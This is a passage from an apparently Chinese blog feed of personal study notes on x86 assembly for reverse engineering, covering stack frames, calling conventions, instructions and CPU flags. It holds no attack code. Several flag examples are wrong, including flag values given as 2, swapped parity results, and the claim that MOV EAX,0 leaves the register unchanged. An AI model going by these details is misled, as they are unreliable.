        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>这个还是蛮重要的，所以单独开了一个写一下过程</p><br><h1 id="0x02-开始"><a href="#0x02-开始" class="headerlink" title="0x02 开始"></a>0x02 开始</h1><p>push = esp-4 -&gt; 把值放入esp</p><p>pop = 把值放入寄存器 -&gt; esp+4</p><p>汇编代码是这样的：</p><p>这个是没call之前的</p><p><img src="https://i.loli.net/2020/08/26/3r6tjz4sRHSq8BJ.png" alt="image-20200826224059606.png"></p><p><strong>提前push的值都是调用函数的参数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参数：</span><br><span class="line">push 0x4</span><br><span class="line">push 0x3</span><br><span class="line">push 0x2</span><br></pre></td></tr></table></figure><p>此时的堆栈图：</p><p><img src="https://i.loli.net/2020/08/26/h52TUsRBZitWnHX.png"></p><hr><p>call之后</p><p><img src="https://i.loli.net/2020/08/26/WFYwcnKgLUH7Abx.png" alt="image-20200826223507775.png"></p><p>进入jmp</p><p><img src="https://i.loli.net/2020/08/26/KFZLa3qTf569m7c.png" alt="image-20200826224302522.png"></p><p>此时的堆栈图：</p><p><img src="https://i.loli.net/2020/08/26/PxDNKlm18ABHiz4.png" alt="QQ截图20200826224552.png"></p><p>在把参数压入栈之后再把ebp栈底也也压入栈，之后把esp的值赋给ebp。</p><p>此时栈中情况是这样的（和图基本一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ediesp</span><br><span class="line">esi</span><br><span class="line">ebx</span><br><span class="line">断点×16</span><br><span class="line">原ebp的值ebp</span><br><span class="line">返回地址</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">之前程序用剩下的...</span><br><span class="line">原ebp</span><br></pre></td></tr></table></figure><p>题外话：要注意的是<strong>堆栈平衡</strong>（调用完一个函数前和调用完一个函数后，堆栈没有变化），所以这些值稍后都会返回。</p><p>接下来把esp减了0x40。之后会填充cccccccc的值，cc相当于<code>int3</code>的硬编码，也就是断点，是为了防止缓冲区溢出。程序没用到的内存，需要做特别处理，否则程序会运行，所以程序会把不用的地方全写成cc。</p><p><strong>如果函数什么也不做，那么vc6会生成0x40的缓冲区，每多一个局部变量，便会多减4。long long减8。会在函数生成之前分配完成。</strong></p><p>然后就是<strong>push ebx，push esi，push edi</strong>，把寄存器原先的值保存一下，因为接下来要用到。</p><p><strong>（这里将三个寄存器压栈的原因就是相关调用约定（具体来说是 x86 cdecl ）将这三个寄存器规定为非易失寄存器。）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lea edi, dword ptr ss:[ebp-0x40]</span><br><span class="line">mov ecx, 0x10</span><br><span class="line">mov eax, 0xcccccccc</span><br><span class="line">rep stos dword ptr ptr es:[edi]</span><br><span class="line"></span><br><span class="line">mov eax, dword ptr ss:[ebp+0x8]</span><br><span class="line">add eax, dword ptr ss:[ebp+0xc]</span><br><span class="line">sub eax, dword ptr ss:[ebp+0x10]</span><br></pre></td></tr></table></figure><p>前四步都是在填充cc的值，没啥好说的，看看我上面写的和图就差不多能懂。lea取地址（0019FE90），然后就是ecx和rep的重复。</p><p>下面三行就是这个函数的作用，很简单，2+3-4，大概是下面这样的代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">huibian</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b-c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">huibian</span>(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后函数就结束了，堆栈平衡，把之间压入的寄存器ebx，esi，edi弹回去。</p><p>此时堆栈图：</p><p><img src="https://i.loli.net/2020/08/26/rEbKNUmzF3su6YI.png" alt="QQ截图20200826231723.png"></p><p>然后把ebp的值传到esp里去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">断点×16</span><br><span class="line">原ebp的值ebp,esp</span><br><span class="line">返回地址</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">之前程序用剩下的...</span><br><span class="line">原ebp</span><br></pre></td></tr></table></figure><p>然后再把ebp弹出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">返回地址esp</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">参数</span><br><span class="line">之前程序用剩下的...</span><br><span class="line">原ebpebp</span><br></pre></td></tr></table></figure><p>retn就返回回去了（retn = pop eip）</p><p><img src="https://i.loli.net/2020/08/26/AfowlCZb8mB49h2.png" alt="QQ截图20200826232044.png"></p><p>因为要堆栈平衡，所以就<code>add esp, 0xc(12)</code>把参数的栈清掉。</p><br><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>一个函数的运行过程</p><ol><li>（把参数压入栈，参数是倒着压入的，先压入后面的参数）call跳转运行；</li><li>把栈底地址压入栈，同时让栈底变成push ebp的那个地址（方便存取参数），提升栈底；</li><li>留下缓存空间；</li><li>把寄存器的值压入栈（保存现场）；</li><li>程序把不用的地方（缓存空间）填入cc，否则垃圾数据会影响程序运行；</li><li>函数运行；</li><li>函数结束，各种清栈。</li></ol><p><strong>不要思维定势，认为参数只能压入栈。也可以放到寄存器等等，只要能让函数用到就行。</strong></p><h1 id="0x04-调用约定"><a href="#0x04-调用约定" class="headerlink" title="0x04 调用约定"></a>0x04 调用约定</h1><p>上面提到的调用约定</p><table><thead><tr><th>调用约定</th><th>参数压栈顺序</th><th>平衡堆栈</th></tr></thead><tbody><tr><td>__cdecl</td><td>从右至左入栈（从后往前）</td><td>函数外部清理堆栈</td></tr><tr><td>__stdcall</td><td>从右至左入栈</td><td>函数内部清理堆栈</td></tr><tr><td>__fastcall</td><td>ECX/EDX传送前两个，剩下：从右至左入栈</td><td>只有两个不需要清理堆栈，多的在函数内部清理。</td></tr></tbody></table><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用方法</span></span><br><span class="line"></span><br><span class="line">返回类型 调用约定 函数名(参数)&#123;&#125;</span><br></pre></td></tr></table></figure><p>这个也是c和c++默认的调用约定</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push <span class="number">2</span></span><br><span class="line">push <span class="number">1</span></span><br><span class="line">call @ILT+<span class="number">15</span>(fun) (<span class="number">00401014</span>)</span><br><span class="line">add esp,<span class="number">8</span></span><br></pre></td></tr></table></figure><p>WindowsAPI的调用方式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push <span class="number">2</span></span><br><span class="line">push <span class="number">1</span></span><br><span class="line">call @ILT+<span class="number">10</span>(fun) (<span class="number">0040100f</span>)</span><br><span class="line">函数内部:</span><br><span class="line">ret <span class="number">8</span></span><br><span class="line"><span class="comment">//ret的意思是先ret再esp+8</span></span><br></pre></td></tr></table></figure><p>别的都是用堆栈（内存）传递数据，fastcall用寄存器edx，ecx传递数据。如果经常使用这个函数，应该用这种方式写函数。只有两个函数不需要清理堆栈。用这个约定最好只写两个参数，否则和别的区别不大。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mov edx,<span class="number">2</span></span><br><span class="line">mov ecx,<span class="number">1</span></span><br><span class="line">call @ILT+<span class="number">0</span>(fun) (<span class="number">00401005</span>)</span><br><span class="line">函数内部:</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><br><h1 id="0x05-注意"><a href="#0x05-注意" class="headerlink" title="0x05 注意"></a>0x05 注意</h1><p>函数之前提前push的值不一定是当前函数的参数，因为经过优化之后，可能根本没用到当前参数，而是后面函数的参数。</p>]]></content>
      
      
      <categories>
          
          <category> 2020年8月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向_基础</title>
      <link href="/2020/08/17/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91_%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/08/17/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91_%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-进制01"><a href="#0x01-进制01" class="headerlink" title="0x01 进制01"></a>0x01 进制01</h1><p>十进制的定义是由10个符号组成，逢十进一。</p><p>n进制的定义是由n个符号组成，逢n进一，如果自己定义符号，而不是简单的12345等等，将给解密者带来很大麻烦。</p><p><strong>进制的运算不应该是靠转换，而是查表。</strong></p><br><h1 id="0x02-数据宽度—逻辑运算"><a href="#0x02-数据宽度—逻辑运算" class="headerlink" title="0x02 数据宽度—逻辑运算"></a>0x02 数据宽度—逻辑运算</h1><p>受硬件影响，数据有长度限制，超过宽度的数据会被丢掉。</p><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1011000101</span><br><span class="line">or1001100110</span><br><span class="line">_________________________</span><br><span class="line">1011100111</span><br></pre></td></tr></table></figure><p>与</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1011000101</span><br><span class="line">and1001100110</span><br><span class="line">_________________________</span><br><span class="line">1001000100</span><br></pre></td></tr></table></figure><p>异或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1011000101</span><br><span class="line">xor1001100110</span><br><span class="line">_________________________</span><br><span class="line">0010100011</span><br></pre></td></tr></table></figure><p>非</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">not1001100110</span><br><span class="line">__________________________</span><br><span class="line">0110011001</span><br></pre></td></tr></table></figure><h2 id="实际计算"><a href="#实际计算" class="headerlink" title="实际计算"></a>实际计算</h2><p>计算机内部的复杂运算都是用与或非异或等开关来计算的：</p><p>例如2+3</p><p>换成二进制就是0010和0011</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//先把两个异或一下</span><br><span class="line">0010</span><br><span class="line">xor 0011</span><br><span class="line">____________</span><br><span class="line">0001</span><br><span class="line"></span><br><span class="line">//然后再and一下</span><br><span class="line">0010</span><br><span class="line">&amp;0011</span><br><span class="line">____________</span><br><span class="line">0010</span><br></pre></td></tr></table></figure><p>然后把and的结果右移一下，如果右移结果为0，异或的结果就是2+3的答案。如果结果不是0，就把右移完的结果和异或完的结果重新计算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0010 &lt;&lt; 1 == 0100 //因为不是0</span><br><span class="line"></span><br><span class="line">0001</span><br><span class="line">xor0100</span><br><span class="line">___________</span><br><span class="line">0101</span><br><span class="line"></span><br><span class="line">0001</span><br><span class="line">&amp;0100</span><br><span class="line">___________</span><br><span class="line">0000</span><br><span class="line"></span><br><span class="line">0000 &lt;&lt; 1 == 0</span><br><span class="line">//所以2+3的结果为 0101 也就是5</span><br><span class="line">//计算相减其实就是加负数</span><br></pre></td></tr></table></figure><h2 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h2><p>大部分加密解密都是用了异或的概念</p><p>例如加密2014，设置一个密钥5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">2014转化为二进制就是 0010 0000 0001 0100</span><br><span class="line">密钥为 0101</span><br><span class="line">加密:</span><br><span class="line">0010 0000 0001 0100</span><br><span class="line">xor0101 0101 0101 0101</span><br><span class="line">_________________________</span><br><span class="line">0111 0101 0100 0001</span><br><span class="line">加密结果为7541</span><br><span class="line">解密:</span><br><span class="line">0111 0101 0100 0001</span><br><span class="line">xor0101 0101 0101 0101</span><br><span class="line">_________________________</span><br><span class="line">0010 0000 0001 0100</span><br></pre></td></tr></table></figure><br><h1 id="0x03-汇编"><a href="#0x03-汇编" class="headerlink" title="0x03 汇编"></a>0x03 汇编</h1><h2 id="32位通用寄存器"><a href="#32位通用寄存器" class="headerlink" title="32位通用寄存器"></a>32位通用寄存器</h2><table><thead><tr><th>32位寄存器</th><th>16位寄存器</th><th>8位寄存器</th><th>主要用途</th><th>编号</th></tr></thead><tbody><tr><td>EAX</td><td>AX</td><td>AL</td><td>累加器</td><td>0</td></tr><tr><td>ECX</td><td>CX</td><td>CL</td><td>计数</td><td>1</td></tr><tr><td>EDX</td><td>DX</td><td>DL</td><td>I/O指针</td><td>2</td></tr><tr><td>EBX</td><td>BX</td><td>BL</td><td>DS段的数据指针</td><td>3</td></tr><tr><td>ESP</td><td>SP</td><td>AH</td><td>堆栈指针</td><td>4</td></tr><tr><td>EBP</td><td>BP</td><td>CH</td><td>SS段的数据指针</td><td>5</td></tr><tr><td>ESI</td><td>SI</td><td>DH</td><td>字符串操作的源指针；SS段的数据指针</td><td>6</td></tr><tr><td>EDI</td><td>DI</td><td>BH</td><td>字符串操作的目标指针；ES段的数据指针</td><td>7</td></tr></tbody></table><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><p><strong>汇编指令由操作码和操作数组成</strong></p><p><code>mov eax,1</code></p><p>mov是操作码，1是源操作数，eax是目标操作数。</p><ul><li>源操作数和目标操作数不能同时为内存单元。</li><li>操作数宽度必须一样</li></ul><p>我们学的是32位寄存器，最多能存储<code>32/4=8</code>个数字。所以如果<code>mov eax,123456789</code>，eax只会存储<code>23456789</code>。</p><hr><p><code>lea eax, dword ptr ds:[12ffc4]</code></p><p>取地址，eax的值为12ffc4，而不是地址中存储的值。</p><hr><p><code>pushad</code>把8个通用寄存器的值存到堆栈里去，用<code>popad</code>弹出。</p><hr><p><code>push，pop</code>不能压入或弹出8位寄存器或者内存。</p><hr><p><code>adc</code>带进位加法，adc ax,bx的意思是a=ax+bx+cf</p><p><code>sbb</code>带进位减法</p><hr><p><code>xchg</code>交换，交换两个寄存器或内存的值。</p><hr><p><code>movs</code>移动数据</p><p><code>movsb</code>的意思是mov byte，移动esi中地址数据到edi中，同时esi,edi都加1；</p><p><code>movsw</code>的意思是mov word，移动esi中地址数据到edi中，同时esi,edi都加2；</p><p><code>movsd</code>的意思是mov dword，移动esi中地址数据到edi中，同时esi,edi都加4。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esi,0x19FF74</span><br><span class="line">mov edi,0x19FF90</span><br><span class="line">movs byte ptr es:[edi],byte ptr ds:[esi]//movsb其实就是这个的简写</span><br></pre></td></tr></table></figure><p>受df标志位影响，如果df标志位为1，则从加变成减。</p><hr><p><code>stos</code>，将AL/AX/EAX的值存储到[EDI]指定的内存单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stos byte ptr es:[edi]//简写为stosb，edi加1；</span><br><span class="line">stos word ptr es:[edi]//简写为stosw，edi加2；</span><br><span class="line">stos dword ptr es:[edi]//简写为stosd，edi加4；</span><br></pre></td></tr></table></figure><p>受df标志位影响，如果df标志位为1，则从加变成减。</p><hr><p><code>rep</code>指令，按计数寄存器（ecx）中指定的次数重复执行字符串指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ecx,10</span><br><span class="line">rep movsd//重复16次</span><br><span class="line">rep stosd//重复16次</span><br></pre></td></tr></table></figure><hr><p><code>jmp</code>指令，修改eip的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp short //跳转的值离原来的值小与128字节，就用short</span><br></pre></td></tr></table></figure><hr><p><code>call</code>指令，修改eip的值，并会把下一行指令的地址压入栈。</p><p><strong>call的本质就是jmp 地址，push 下一条指令的地址</strong></p><p><code>retn</code>指令，弹出栈中的地址并跳转。</p><p><strong>retn的本质就是pop eip。</strong></p><hr><p><code>cmp</code>指令：比较两个操作数，<strong>相当于sub指令，但是相减的结构不存，只根据相减的结果改变标志位，当两个操作数相等时，ZF位1。</strong></p><p>一般用于比较两个数是否相等。</p><hr><p><code>test</code>指令：两个数进行与操作，改变标志位。</p><p>一般用于判断寄存器是否等于0。</p><hr><p><code>movsx</code>指令：用于有符号类型转换，先<strong>符号</strong>扩展，再移动。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov al,0xff</span><br><span class="line">movsx cx,al;cx的值为ffff</span><br><span class="line">mov al,0x1f</span><br><span class="line">movsx cx,al;cx的值为001f</span><br></pre></td></tr></table></figure><p>符号扩展的意思是用符号位填充少的宽度。</p><p><code>movzx</code>指令：用于无符号类型转换，先零扩展，再移动。</p><p>零扩展的意思是用0填充少的宽度。</p><hr><p><code>sete</code>用于设置bool值，可以参照jcc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov eax,dword ptr [ebp+8]</span><br><span class="line">xor ecx,ecx</span><br><span class="line">cmp eax,dword ptr [ebp+0ch]</span><br><span class="line">sete cl</span><br></pre></td></tr></table></figure><p>效果cl=zf，如果[ebp+8]=[ebp+0ch]则eax为1</p><hr><p><code>offset</code>可以看成一个具体的地址</p><br><h2 id="寄存器与内存的区别"><a href="#寄存器与内存的区别" class="headerlink" title="寄存器与内存的区别"></a>寄存器与内存的区别</h2><ol><li>寄存器位于CPU内部，执行速度快，但比较贵</li><li>内存速度相对较慢，但成本低，可以做的很大</li><li>寄存器和内存没有本质上的区别，都是用于存储数据的容器，都是定宽的</li></ol><p>32位的计算机和64位的计算机区别在于寻址能力而不是CPU。</p><p>32位的计算机有32根总线，我们可以理解为32位Bit，一个32位计算机内存寻址的最大范围是<code>0xFFFFFFFF+1</code>（加一是因为包括0）。0xFFFFFFFF+1字节可以转换成4g。所以32位计算机最大只能有4g内存，在大无法识别。并且因为本身自带的硬件占用一些，远远不到4g。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov word DS:ptr[0x12345678], 0xFFFF</span><br></pre></td></tr></table></figure><p>ptr的意思后面是一个指针（指针里面存储了一个地址），word的意思是要读写多少，可以改成<code>byte</code>，<code>word</code>和<code>dword</code></p><p><strong>每个内存单元能存储一个字节。每个字节有个编号，称为内存地址。</strong></p><h2 id="大端序和小端序"><a href="#大端序和小端序" class="headerlink" title="大端序和小端序"></a>大端序和小端序</h2><p>我们首先使用指令：<code>mov dword ptr [0x19FF74],0x23456789</code></p><p>然后会发现数据窗口是这么存储23456789的</p><p><img src="https://i.loli.net/2020/08/20/7Cz2UQ1V3MsGuNF.png" alt="image-20200820124756561.png"></p><p>这是因为字节的存储顺序是小端序，<strong>数据的高位字节存放在内存的高地址</strong></p><p>大端序则是高字节存放在内存的低地址。</p><h2 id="标志位"><a href="#标志位" class="headerlink" title="标志位"></a>标志位</h2><p><strong>mov不改变标志位</strong></p><p><strong>是无符号运算还是有符号运算由我们说了算</strong></p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>0</td><td>CF</td><td>进位标志</td></tr><tr><td>2</td><td>PF</td><td>奇偶标志</td></tr><tr><td>4</td><td>AF</td><td>辅助进位标志</td></tr><tr><td>6</td><td>ZF</td><td>零标志</td></tr><tr><td>7</td><td>SF</td><td>符号标志</td></tr><tr><td>8</td><td>TF</td><td>单步标志</td></tr><tr><td>9</td><td>IF</td><td>中断使能标志</td></tr><tr><td>10</td><td>DF</td><td>方向标志</td></tr><tr><td>11</td><td>OF</td><td>溢出标志</td></tr></tbody></table><ol><li>进位标志CF（carry flag）：如果运算结果的最高位产生一个进位或错位，那么其值为1，否则值为0。（无符号数）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,0xEF</span><br><span class="line">ADD AL,2</span><br><span class="line">//CF值为0</span><br><span class="line">MOV AL,0xFE</span><br><span class="line">ADD AL,2</span><br><span class="line">//CF值为1</span><br><span class="line">MOV AL,0xF0</span><br><span class="line">SUB AL,0xFF</span><br><span class="line">//CF值为1</span><br></pre></td></tr></table></figure><hr><ol start="2"><li>奇偶标志PF（Parity Flag）：奇偶标志PF用于反映运算结果中1的个数的奇偶性。如果1的个数为偶数，PF值为1，否则值为0。<strong>（最低有效字节，只看最后八位）</strong>不管32位16位还是8位的数，都只看最后八位有多少1。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,3</span><br><span class="line">ADD AL,3</span><br><span class="line">//3+3=6,0110,PF值为2</span><br><span class="line">ADD AL,2</span><br><span class="line">//6+2=8,1000,PF值为1</span><br></pre></td></tr></table></figure><hr><ol start="3"><li>辅助进位标志AF（Auxiliary Carry Flag）：</li></ol><p>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0。</p><ul><li>在字操作时，发生低字节向高字节进位或借位时</li><li>在字节操作时，发生低4位向高4位进位或借位时</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX, 0x55EEFFFF</span><br><span class="line">ADD EAX, 2</span><br><span class="line">//AF的值为2</span><br><span class="line">MOV AX, 5EFE</span><br><span class="line">ADD AX, 2</span><br><span class="line">//AF的值为2</span><br><span class="line">MOV AL, 4E</span><br><span class="line">ADD AL, 2</span><br><span class="line">//AF的值为2</span><br></pre></td></tr></table></figure><hr><ol start="4"><li>零标志ZF（Zero Flag），零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XOR EAX, EAX</span><br><span class="line">//EAX清0,ZF值为1</span><br><span class="line">MOV EAX, 2</span><br><span class="line">SUB EAX, 2</span><br><span class="line">//ZF值为1</span><br></pre></td></tr></table></figure><p><strong>如果使用<code>MOV EAX,0</code>是不改变寄存器的</strong></p><hr><ol start="5"><li>符号标志SF（Sign Flag）,符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,7F</span><br><span class="line">ADD AL,2</span><br><span class="line">//7F = 0111 1111</span><br><span class="line">//7f+2 = 81</span><br><span class="line">//81 = 1000 0001</span><br><span class="line">//SF的值为1</span><br></pre></td></tr></table></figure><hr><ol start="6"><li>溢出标志OF（Overflow Flag），溢出标志OF用于反映<strong>有符号数</strong>加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表达的范围，则称为溢出，OF值为1。否则OF的值为0。</li></ol><p>和CF类似，不过这个是有符号数，取决于最高位。最高位由1变成0或者由0变成1，都会改变OF的值。</p><p>正+正=正 如果等于负数，则溢出</p><p>负+负=负 如果等于正数，则溢出</p><p>负+正不会溢出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov al,80</span><br><span class="line">sub al,40</span><br><span class="line">//1000 0000</span><br><span class="line">//+1100 0000</span><br><span class="line">//___________________</span><br><span class="line">//0100 0000</span><br><span class="line">//OF值为1</span><br><span class="line">//减法其实也是加法，只不过加的是有符号数负数。</span><br></pre></td></tr></table></figure><hr><p><img src="https://i.loli.net/2020/08/24/oGWm9J4TOxaAhP1.png"></p><p><strong>80-FF是负数，0到7F是正数</strong></p><h2 id="jcc"><a href="#jcc" class="headerlink" title="jcc"></a>jcc</h2><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>JE，JZ</td><td>结果为0时跳转</td><td>ZF = 1</td></tr><tr><td>JNE，JNZ</td><td>结果不为0时跳转</td><td>ZF = 0</td></tr><tr><td>JS</td><td>结果为负则跳转</td><td>SF = 1</td></tr><tr><td>JNS</td><td>结果为非负则跳转</td><td>SF = 0</td></tr><tr><td>JP，JPE</td><td>结果中1的个数为偶数则跳转</td><td>PF = 1</td></tr><tr><td>JNP，JPO</td><td>结果中1的个数为奇数则跳转</td><td>PF = 0</td></tr><tr><td>JO</td><td>结果溢出则跳转</td><td>OF = 1</td></tr><tr><td>JNO</td><td>结果没有溢出则跳转</td><td>OF = 